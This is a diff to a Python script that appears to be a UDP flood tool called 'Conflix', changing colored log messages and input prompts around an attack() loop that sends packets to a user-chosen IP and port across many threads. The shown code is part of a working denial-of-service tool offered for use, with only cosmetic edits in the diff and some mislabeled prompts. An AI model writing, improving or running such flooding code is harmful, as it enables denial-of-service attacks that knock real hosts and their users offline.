@@ -60,6 +60,7 @@ def attack(ip: str, port: int, packet_size: int, rate_limit: float):
             sock.sendto(data, (ip, port))
             sent += 1
             log_message(f"\033[94mConflix- \033[37m{threading.get_ident()}: \033[32mSent =⟩{sent} \033[94m{ip}:{port}")
+            log_message(f"\033[32mConflix- \033[96m{threading.get_ident()}: \033[4mSent =⟩{sent} \033[33m{ip}:{port}")
             port = port + 1 if port < 65534 else 1
             time.sleep(rate_limit)
     except KeyboardInterrupt:
@@ -73,16 +74,16 @@ def attack(ip: str, port: int, packet_size: int, rate_limit: float):
 def main():
     os.system("clear")
     print(logo)
-    ip = input("\033[33m==⟩  IP: \033[32m").strip()
+    ip = input("\033[33m==⟩ IP: \033[32m").strip()
     if not validate_ip(ip):
-        log_message("Invalid IP address provided. Exiting...")
+        log_message("\033[31m==⟩ Invalid IP address. Exiting...")
         sys.exit(1)
 
     try:
-        port = int(input("\033[1;35m [+] =⟩ IP (default 80): \033[33m").strip() or 80)
-        packet_size = int(input("\033[33m==⟩ Size (default 1490 bytes): \033[32m").strip() or 1490)
-        threads = int(input(" [+] Enter Number of Threads (default 4): ").strip() or 4)
-        rate_limit = float(input(" [+] Enter Rate Limit (seconds, default 0.01): ").strip() or 0.01)
+        port = int(input("\033[33m==⟩ IP [default 80]: \033[33m").strip() or 80)
+        packet_size = int(input("\033[33m==⟩ Size [default 1490 bytes]: \033[32m").strip() or 1490)
+        threads = int(input("\033[33m==⟩ Number Of threads [default 4]: ").strip() or 4)
+        rate_limit = float(input("\033[33m==⟩ Duration [seconds]: ").strip() or 0.01)
     except ValueError:
         log_message("Invalid input provided. Exiting...")
         sys.exit(1)
@@ -103,7 +104,7 @@ def main():
         for thread in thread_list:
             thread.join()
     except KeyboardInterrupt:
-        log_message("Attack stopped by user.")
+        log_message("\033[92m Finally Attack.\033[0m")
 
 if __name__ == "__main__":
     main()
